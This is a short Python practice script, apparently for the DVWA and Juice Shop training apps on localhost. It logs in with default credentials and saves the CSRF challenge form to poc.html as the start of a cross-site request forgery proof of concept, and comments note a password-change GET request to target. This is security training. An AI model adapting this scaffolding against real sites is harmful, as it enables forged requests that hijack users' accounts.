#post {"email":"tst@tst.com","password":"12345"} login
#GET /rest/user/change-password?current=12345&new=123456&repeat=123456 change

import requests
import warnings
from bs4 import BeautifulSoup
warnings.filterwarnings("ignore")
session = requests.Session()
creds = ["admin", "password"]

#url = "https://juice-shop.herokuapp.com/"
def login(creds):
	url = "http://localhost/DVWA/"
	page = session.get("http://localhost/DVWA/")
	soup = BeautifulSoup(page.content, 'html.parser')
	form = soup.find('form')

	fields = form.findAll('input')

	formdata = dict( (field.get('name'), field.get('value')) for field in fields)
	action = form.get('action')

	formdata['username'] = creds[0]
	formdata['password'] = creds[1]

	session.post(url+action, formdata)


def create_poc():
	formUrl = "http://localhost/DVWA/vulnerabilities/csrf/"

	page = session.get(formUrl)
	soup = BeautifulSoup(page.content, 'html.parser')
	form = soup.find_all('form')
	print(form)
	f = open("poc.html", "w")
	f.write(str(form[0]))
	f.close()


	#fields = form.findAll('input')

	# formdata = dict( (field.get('name'), field.get('value')) for field in fields)

	# formdata['username'] = u'username'
	# formdata['password'] = u'password'

	# print(formdata)
login(creds)
create_poc()
# login = requests.Session()
# print(login.post(loginPage, creds))


# from selenium import webdriver
# driver = webdriver.PhantomJS()
# driver.set_window_size(1120, 550)
# driver.get(url)
# driver.find_element_by_id("navbarAccount").click()
# driver.find_element_by_id("navbarLoginButton").click()
# driver.save_screenshot('google.jpg')

# driver.find_element_by_id("navbarLoginButton").click()


# print(driver.current_url)
# driver.quit()